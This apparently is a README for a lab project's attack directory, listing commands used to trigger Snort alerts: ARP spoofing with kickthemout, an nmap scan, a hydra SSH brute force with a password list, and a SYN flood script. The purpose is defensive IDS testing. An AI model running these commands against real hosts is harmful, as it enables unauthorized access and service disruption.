# attacks
Directory containing the code used for the test attacks used for triggering the snort alerts. 

The structure of the project is the following one.

 - **kicktheamount**: Tool to perform and ARP spoofing on the victim. Link [here](https://github.com/k4m4/kickthemout).

```
 sudo python3 kickthemout.py --target 192.168.1.10

 sudo python3 kickthemout.py --target <ip>
``` 

- **port scanning**: Simple nmap scan on the ip. More options are possible to be added but at this point it's enough.

```
nmap 172.16.46.2

nmap <ip>
```

- **ssh brute force**: The tool used is hydra. The test command used is the following one.
 
```
./hydra -s 22 -v -V -l fran -P ../SecLists/Passwords/darkweb2017-top1000.txt -t 8 192.168.1.10 ssh

./hydra -s 22 -v -V -w 4 -l fran -P ../SecLists/Passwords/darkweb2017-top1000.txt -t 8 192.168.1.10 ssh

./hydra -s <port> -v -V -w <waittime> -l <username> -P <path to password file> -t <number of threads> <ip> <protocol>
```

 - **syn_flood**: Tool to be used for the Syn Flood Attack based on the project [pyddos](https://github.com/mach1el/pyddos) by [mach1el](https://github.com/mach1el)..
 
```
sudo python syn_flood.py -d 192.168.1.10 -p 22 -t 1

sudo python syn_flood.py -d <ip> -p <port> -t <number of threads>
```
  
 
 
